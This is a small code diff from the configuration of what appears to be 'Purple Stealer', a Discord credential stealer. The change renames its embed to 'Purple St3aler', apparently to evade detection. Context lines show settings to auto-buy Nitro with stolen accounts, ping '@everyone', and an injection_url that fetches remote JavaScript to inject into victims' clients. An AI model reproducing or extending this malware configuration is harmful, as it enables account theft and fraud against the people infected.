@@ -11,7 +11,7 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'Purple Stealer',  
+  embed_name: 'Purple St3aler',  
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/OpenSearch0001/unknownahfdhnsfhsdfhnj/main/index.js', 
   /**
